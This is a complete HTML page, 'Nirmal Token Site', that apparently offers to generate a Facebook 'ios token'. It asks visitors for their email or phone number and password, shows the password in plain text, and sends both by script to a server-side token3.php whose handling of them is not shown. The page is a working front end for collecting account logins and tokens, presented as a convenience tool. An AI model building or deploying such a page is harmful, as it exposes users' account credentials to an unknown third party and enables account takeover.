
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Nirmal Token Site</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<style>
body{background: url(nir.png); 
   reapet: no-reapet;
    font-family: Algerian;
     -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
}
footer{
      color: red;
      font-size: 30px;
      font-type: bold;
	  font-family: Algerian;
	  shadow: 0px,0px,6px,0px white;}
</style>
<body>
<div class="container">
<head><center><font size="60px">  <script language="JavaScript" src="B.js"></script></font></center></head>
  <br><center>
<a target="_blank"  href="https://www.facebook.com/100027065658389">
<img src="https://graph.facebook.com/100027065658389/picture?width=900" alt="" style="border-radius: 100%; border: 1px solid white; box-shadow:0px 0px 13px 0px white;" width="150" height="150" title="Visit admin Profile"/></a></div></div></br><br>
<center><form style="background-color:rgba(0,0,0,.5); padding:10px;">
<div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading" style="font-size:35px; font-family:wide latin; color:red;">Get ios token</div>
      <div class="panel-body">      
<div class="form-group">
  <label for="usr" style="font-family:Algerian; font-size:15px; color:white;">Email or phone no :</label>
  <input type="text" class="form-control" id="tk" style="width:100%; outline:none; font-size:20px; border-bottom: 30px; border-bottom:1px solid white; background-color:transparent; padding:10px 0; color:white;">
</div>
<div class="form-group">
  <label for="pwd" style="font-family:Algerian; font-size:15px; color:white;">Password:</label>
  <input type="text" class="form-control" id="mk" style="width:100%; outline:none; font-size:20px; border-bottom:1px solid white; background-color:transparent; padding:10px 0; color:white;">
</div><br>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" style="background: transparent;
                            outline: none;
                            border: none;
                            color: white;
                            background: red;
                            padding: 20px 10px; font-family:Matura MT Script Capitals; border-radius:30%;">Get Token</button></center>
<p>
<li id="trave" class="list-group-item"><img src=""> </li></p></form>

</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "./token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</body>
<br>
<footer>
<center>Made by : NIR RANA </center>
</footer>
</html>
